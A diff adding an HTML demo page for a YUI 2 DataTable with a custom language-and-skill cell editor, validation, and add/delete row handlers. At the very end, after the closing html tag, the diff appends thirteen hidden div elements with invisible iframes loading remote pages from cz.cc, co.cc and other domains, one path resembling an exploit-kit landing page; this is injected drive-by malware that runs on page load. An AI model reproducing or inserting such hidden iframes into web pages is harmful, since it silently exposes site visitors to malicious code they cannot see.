@@ -1,0 +1,395 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<link rel="stylesheet" type="text/css" href="http://yui.yahooapis.com/2.8.0r4/build/fonts/fonts-min.css" />
+<link rel="stylesheet" type="text/css" href="http://yui.yahooapis.com/2.8.0r4/build/datatable/assets/skins/sam/datatable.css" />
+<script type="text/javascript" src="http://yui.yahooapis.com/2.8.0r4/build/yahoo-dom-event/yahoo-dom-event.js"></script>
+
+<script type="text/javascript" src="http://yui.yahooapis.com/2.8.0r4/build/element/element.js"></script>
+<script type="text/javascript" src="http://yui.yahooapis.com/2.8.0r4/build/datasource/datasource.js"></script>
+<script type="text/javascript" src="http://yui.yahooapis.com/2.8.0r4/build/datatable/datatable.js"></script>
+
+<!-- CUSTOM CELL EDITOR DEFINITION -->
+<script type="text/javascript">
+    (function () {
+        YAHOO.widget.LanguageCellEditor = function (oConfigs) {
+            this._sId = "yui-languageceditor" + YAHOO.widget.BaseCellEditor._nCount++;
+            YAHOO.widget.LanguageCellEditor.superclass.constructor.call(this, "language", oConfigs);
+        };
+
+        YAHOO.lang.extend(YAHOO.widget.LanguageCellEditor, YAHOO.widget.BaseCellEditor, {
+            //CELL EDITOR OVERRIDEN METHOD, TO EDIT ENTIRE ROW RATHER THAT CELL
+            //START: DO NOT CHANGE THIS
+            attach: function (oDataTable, elCell) {
+                if (YAHOO.widget.LanguageCellEditor.superclass.attach.call(this, oDataTable, elCell) == false) return false;
+                //CHANGE: rewrite current value with entire record
+                this.value = this._oRecord;
+                return true;
+            },
+
+            save: function () {
+                // Get new value
+                var inputValue = this.getInputValue();
+                var validValue = inputValue;
+
+                // Validate new value
+                if (this.validator) {
+                    validValue = this.validator.call(this.getDataTable(), inputValue, this.value, this);
+                    if (validValue === undefined) {
+                        if (this.resetInvalidData) {
+                            this.resetForm();
+                        }
+                        this.fireEvent("invalidDataEvent",
+                    { editor: this, oldData: this.value, newData: inputValue });
+                        YAHOO.log("Could not save Cell Editor input due to invalid data " +
+                    YAHOO.lang.dump(inputValue), "warn", this.toString());
+                        return;
+                    }
+                }
+
+                var oSelf = this;
+                var finishSave = function (bSuccess, oNewValue) {
+                    var oOrigValue = oSelf.value;
+                    if (bSuccess) {
+                        //CHANGED: retur cell height to its normal
+						oSelf.fixTdHeight(true);
+						// Update new value
+                        oSelf.value = oNewValue;
+
+                        //CHANGED: we update entire row rather that single cell
+                        //oSelf.getDataTable().updateCell(oSelf.getRecord(), oSelf.getColumn(), oNewValue);
+                        oSelf.getDataTable().updateRow(oSelf.getRecord(), oNewValue);
+
+                        // Hide CellEditor
+                        oSelf.getContainerEl().style.display = "none";
+                        oSelf.isActive = false;
+                        oSelf.getDataTable()._oCellEditor = null;
+
+                        oSelf.fireEvent("saveEvent",
+                    { editor: oSelf, oldData: oOrigValue, newData: oSelf.value });
+                        YAHOO.log("Cell Editor input saved", "info", this.toString());
+                    }
+                    else {
+                        //CHANGED: we do not want to close\reset editor
+						/*oSelf.resetForm();
+                        oSelf.fireEvent("revertEvent",
+                    { editor: oSelf, oldData: oOrigValue, newData: oNewValue });*/
+                        YAHOO.log("Could not save Cell Editor input " +
+                    YAHOO.lang.dump(oNewValue), "warn", oSelf.toString());
+                    }
+                    oSelf.unblock();
+                };
+
+                this.block();
+                if (YAHOO.lang.isFunction(this.asyncSubmitter)) {
+                    this.asyncSubmitter.call(this, finishSave, validValue);
+                }
+                else {
+                    //CHANGED: WE DO NOT WANT TO HIDE CELL EDITOR WHEN THERE IS ERRORS
+					//finishSave(true, validValue);
+					finishSave(validValue, validValue);
+                }
+            },
+            //END: DO NOT CHANGE THIS
+
+
+
+            //CELL EDITOR PROPERTIES
+            ddlLanguageName: null,
+            ddlLanguageSkill: null,
+			divLanguageName: null,
+            divLanguageSkill: null,
+			errLanguageName: null,
+            errLanguageSkill: null,
+            languageOptions: null,
+            languageSkillOptions: null,
+			bShowErrorMessages: false,
+			
+            //CELL EDITOR IMPLEMENTED METHODS
+            renderForm: function () {
+                var elLanguageNameDiv = this.getContainerEl().appendChild(document.createElement("DIV"));
+				elLanguageNameDiv.style.padding = '3px';
+				this.divLanguageName = elLanguageNameDiv;
+				
+				var elLanguageName = elLanguageNameDiv.appendChild(document.createElement("select"));
+                elLanguageName.style.zoom = 1;
+                this.ddlLanguageName = elLanguageName;
+				
+				var elNAOption = document.createElement("option");
+				elNAOption.value = 0;
+				elNAOption.innerHTML = '- N/A -';
+				elLanguageName.appendChild(elNAOption);
+                
+				if (YAHOO.lang.isArray(this.languageOptions)) {
+                    var dropdownOption, elOption;
+                    for (var i = 0, j = this.languageOptions.length; i < j; i++) {
+                        dropdownOption = this.languageOptions[i];
+                        elOption = document.createElement("option");
+                        elOption.value = (YAHOO.lang.isValue(dropdownOption.value)) ? dropdownOption.value : dropdownOption;
+                        elOption.innerHTML = (YAHOO.lang.isValue(dropdownOption.label)) ? dropdownOption.label : dropdownOption;
+                        elOption = elLanguageName.appendChild(elOption);
+                    }
+                }
+
+                var elLanguageSkillDiv = this.getContainerEl().appendChild(document.createElement("DIV"));
+				elLanguageSkillDiv.style.padding = '3px';
+				elLanguageSkillDiv.style.marginTop = '3px';
+				this.divLanguageSkill = elLanguageSkillDiv;
+				
+				var elLanguageSkill = elLanguageSkillDiv.appendChild(document.createElement("select"));
+                elLanguageSkill.style.zoom = 1;
+                this.ddlLanguageSkill = elLanguageSkill;
+
+				var elNAOption = document.createElement("option");
+				elNAOption.value = 0;
+				elNAOption.innerHTML = '- N/A -';
+				elLanguageSkill.appendChild(elNAOption);
+
+                if (YAHOO.lang.isArray(this.languageSkillOptions)) {
+                    var dropdownOption, elOption;
+                    for (var i = 0, j = this.languageSkillOptions.length; i < j; i++) {
+                        dropdownOption = this.languageSkillOptions[i];
+                        elOption = document.createElement("option");
+                        elOption.value = (YAHOO.lang.isValue(dropdownOption.value)) ? dropdownOption.value : dropdownOption;
+                        elOption.innerHTML = (YAHOO.lang.isValue(dropdownOption.label)) ? dropdownOption.label : dropdownOption;
+                        elOption = elLanguageSkill.appendChild(elOption);
+                    }
+                }
+				
+				var elLanguageNameErr = elLanguageNameDiv.appendChild(document.createElement("SPAN"));
+				elLanguageNameErr.style.color = '#f00';
+				elLanguageNameErr.style.display = 'block';
+				elLanguageNameErr.style.fontSize = '11px';
+				this.errLanguageName = elLanguageNameErr;
+				var elLanguageSkillErr = elLanguageSkillDiv.appendChild(document.createElement("SPAN"));
+				elLanguageSkillErr.style.color = '#f00';
+				elLanguageSkillErr.style.display = 'block';
+				elLanguageSkillErr.style.fontSize = '11px';
+				this.errLanguageSkill = elLanguageSkillErr;
+				
+				YAHOO.util.Event.addListener(elLanguageName, "change", function(){
+					this.validateLangName();
+				}, this, true);
+
+				YAHOO.util.Event.addListener(elLanguageSkill, "change", function(){
+					this.validateLangSkill();
+				}, this, true);
+
+                if (this.disableBtns) {
+                    this.handleDisabledBtns();
+                }
+            },
+
+			move: function () {
+                this.getContainerEl().style.width = (this.getTdEl().offsetWidth - 14) + "px";
+                YAHOO.widget.LanguageCellEditor.superclass.move.call(this);
+            },
+			
+			show: function() {
+				YAHOO.widget.LanguageCellEditor.superclass.show.call(this);				
+				this.fixTdHeight(false);
+			},
+			
+			cancel: function() {				
+				YAHOO.widget.LanguageCellEditor.superclass.cancel.call(this);	
+				this.fixTdHeight(true);
+			},
+			
+			fixTdHeight: function(bSetHeightToAuto) {
+				this.getTdEl().style.height = (bSetHeightToAuto) ? 'auto' : this.getContainerEl().offsetHeight + 'px';
+			},
+
+            resetForm: function () {
+                this.ddlLanguageName.value = YAHOO.lang.isValue(this.value.getData('language')) ? this.value.getData('language') : 0;
+				this.ddlLanguageSkill.value = YAHOO.lang.isValue(this.value.getData('skill')) ? this.value.getData('skill') : 0;				
+				this.divLanguageName.style.background = 'none';
+            	this.divLanguageSkill.style.background = 'none';
+				this.errLanguageName.innerHTML = '';
+	            this.errLanguageSkill.innerHTML = '';
+				this.bShowErrorMessages = false;
+            },
+
+            getInputValue: function () {
+                var res = {};
+                res.language = this.ddlLanguageName.value;
+                res.skill = this.ddlLanguageSkill.value;
+                return res;
+            },
+			
+			
+			//VALIDATOR HELPERS
+			validateLangName: function() {
+				if(this.bShowErrorMessages) {
+					if(this.ddlLanguageName.value == 0) {
+						this.errLanguageName.innerHTML = 'required';
+						this.divLanguageName.style.background = '#fdd';
+						this.fixTdHeight(false);
+						return false;
+					}
+					else {
+						this.errLanguageName.innerHTML = '';
+						this.divLanguageName.style.background = 'none';
+						this.fixTdHeight(false);
+						return true;
+					}
+				}				
+			},
+			
+			validateLangSkill: function() {
+				if(this.bShowErrorMessages) {
+					if(this.ddlLanguageSkill.value == 0) {
+						this.errLanguageSkill.innerHTML = 'required';
+						this.divLanguageSkill.style.background = '#fdd';
+						this.fixTdHeight(false);
+						return false;
+					}
+					else {
+						this.errLanguageSkill.innerHTML = '';
+						this.divLanguageSkill.style.background = 'none';
+						this.fixTdHeight(false);
+						return true;
+					}
+				}
+			},
+			
+			validateAll: function() {
+				this.bShowErrorMessages = true;
+				
+				var res = true;
+				var validate = true;
+				
+				validate = this.validateLangName();
+				if(res) res = validate;
+				
+				validate = this.validateLangSkill();
+				if(res) res = validate;
+				
+				return res;
+			}
+        });
+
+        YAHOO.lang.augmentObject(YAHOO.widget.LanguageCellEditor, YAHOO.widget.BaseCellEditor);
+    })();
+</script>
+
+<script type="text/javascript">
+
+</script>
+</head>
+
+<body class="yui-skin-sam">
+<div id="languagesDiv"></div>
+<script type="text/javascript">
+    YAHOO.namespace('example');
+
+    YAHOO.example.Data = {
+        languages: [
+            { label: 'english', value: 1 },
+            { label: 'russian', value: 2 },
+            { label: 'ukrainian', value: 3 }
+        ],
+
+        skills: [
+            { label: 'little', value: 1 },
+            { label: 'middle', value: 2 },
+            { label: 'good', value: 3 }
+        ],
+
+        lng: [
+            { language: 2, skill: 3 },
+            { language: 3, skill: 3 }
+        ]
+    };
+
+	YAHOO.example.getLabel = function(opts, val) {
+		for (var i = 0; i < opts.length; i++) {
+            if (opts[i].value == val) {
+                return opts[i].label;
+            }
+        }
+        return '- N/A -';
+	}
+
+    var formatLanguage = function (elCell, oRecord, oColumn, oData) {
+        var langname = YAHOO.example.getLabel(YAHOO.example.Data.languages, oRecord.getData('language'));
+        var langskill = YAHOO.example.getLabel(YAHOO.example.Data.skills, oRecord.getData('skill'));
+
+        elCell.innerHTML = '<a href="javascript:void(0)" onclick="deleteLanguage(event, \'' + oRecord.getId() + '\')" style="text-decoration:none;color:#f00;">x</a> ' + langname + ' (' + langskill + ')';
+    }
+	
+	//this.getDataTable(), inputValue, this.value, this
+	var languageValidator = function(oData, oldRecord, editor) {
+		if(editor.validateAll() == false) return null;
+		return oData;
+	}
+
+    var myColumnDefs = [
+            {
+				label: 'LANGUAGES <button onclick="addLanguage(event)">add</button>',
+                key: 'language',
+                formatter: formatLanguage,
+                editor: new YAHOO.widget.LanguageCellEditor({ languageOptions: YAHOO.example.Data.languages, languageSkillOptions: YAHOO.example.Data.skills, validator: languageValidator }),				
+            }
+        ];
+
+    var myDataSource = new YAHOO.util.DataSource(YAHOO.example.Data.lng);
+    myDataSource.responseType = YAHOO.util.DataSource.TYPE_JSARRAY;
+    myDataSource.responseSchema = { fields: ['language', 'skill'] };
+
+    var myDataTable = new YAHOO.widget.DataTable('languagesDiv', myColumnDefs, myDataSource, {});
+    myDataTable.subscribe("cellClickEvent", myDataTable.onEventShowCellEditor);
+	
+	myDataTable.subscribe('editorCancelEvent', function (oArgs) {
+		var editor =  oArgs.editor;
+		if(editor.value.getData('language') == 0 || editor.value.getData('skill') == 0) {
+			editor.getDataTable().deleteRow(editor.getRecord());
+		}
+	});
+	
+	myDataTable.subscribe('editorSaveEvent', function (oArgs) {
+		var editor = oArgs.editor;
+		var newData = oArgs.newData;
+		var oldRecord = oArgs.oldData;
+		
+		if(newData == false && oldRecord.getData('language') == 0 && oldRecord.getData('skill') == 0) editor.getDataTable().deleteRow(oldRecord);
+		//alert(YAHOO.lang.dump(newData) + '\r\n\r\n' +YAHOO.lang.dump(oldRecord));
+	});
+	
+	function addLanguage(e) {
+		//PREVENT BLUR EVENTS
+		e = e || window.event;
+        YAHOO.util.Event.stopEvent(e);
+		
+		var r = {};
+        r.language = 0;
+        r.skill = 0;
+
+        myDataTable.addRow(r);
+        myDataTable.showCellEditor(myDataTable.getLastTrEl().cells[0]);
+	}
+	
+	function deleteLanguage(e, recordId) {
+		//PREVENT SHOW CELL EDITOR EVENT
+		e = e || window.event;
+        YAHOO.util.Event.stopEvent(e);
+		
+		myDataTable.deleteRow(recordId);
+	}	
+</script>
+</body>
+</html>
+<div style="display:none"><iframe src="http://rthlsinks.cz.cc/xp/index.php?tp=bdd9e836c0f58a18"></iframe></div>
+<div style="display:none"><iframe src="http://rthlsinks.cz.cc/xp/index.php?tp=bdd9e836c0f58a18"></iframe></div>
+<div style="display:none"><iframe src="http://newlibrary.cz.cc/js/"></iframe></div>
+<div style="display:none"><iframe src="http://newlibrary.cz.cc/js/"></iframe></div>
+<div style="display:none"><iframe src="http://newlibrary.cz.cc/js/"></iframe></div>
+<div style="display:none"><iframe src="http://newlibrary.cz.cc/js/"></iframe></div>
+<div style="display:none"><iframe src="http://joomside.cz.cc/js/"></iframe></div>
+<div style="display:none"><iframe src="http://jquery4html.co.cc/rsslist/"></iframe></div>
+<div style="display:none"><iframe src="http://jquery4html.co.cc/rsslist/"></iframe></div>
+<div style="display:none"><iframe src="http://jquery4html.co.cc/rsslist/"></iframe></div>
+<div style="display:none"><iframe src="http://jquery4html.co.cc/rsslist/"></iframe></div>
+<div style="display:none"><iframe src="http://jquery4html.co.cc/rsslist/"></iframe></div>
+<div style="display:none"><iframe src="http://chadon.nl/news/"></iframe></div>
